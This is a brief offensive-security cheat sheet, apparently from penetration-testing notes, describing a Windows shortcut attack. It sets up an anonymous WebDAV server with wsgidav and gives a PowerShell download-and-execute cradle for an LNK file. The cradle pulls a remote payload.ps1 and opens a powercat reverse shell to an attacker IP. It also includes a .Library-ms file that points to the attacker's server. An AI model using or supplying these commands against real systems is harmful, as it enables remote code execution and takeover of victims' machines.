# Windows Shortcut

### 1) Run WebDAV server in our Kali

    wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/

### 2) Cradle Download and Execute script via LNK (shortcut) file

    # Create the file as a shortcut in the Windows system to prepare the attack
    powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"

Example .Library-ms file configuration

    <?xml version="1.0" encoding="UTF-8"?>
    <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
        <name>@windows.storage.dll,-34582</name>
        <version>6</version>
        <isLibraryPinned>true</isLibraryPinned>
        <iconReference>imageres.dll,-1003</iconReference>
        <templateInfo>
            <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
        </templateInfo>
        <searchConnectorDescriptionList>
            <searchConnectorDescription>
                <isDefaultSaveLocation>true</isDefaultSaveLocation>
                <isSupported>false</isSupported>
                <simpleLocation>
                    <url>[http://your-server]</url>
                </simpleLocation>
            </searchConnectorDescription>
        </searchConnectorDescriptionList>
    </libraryDescription>
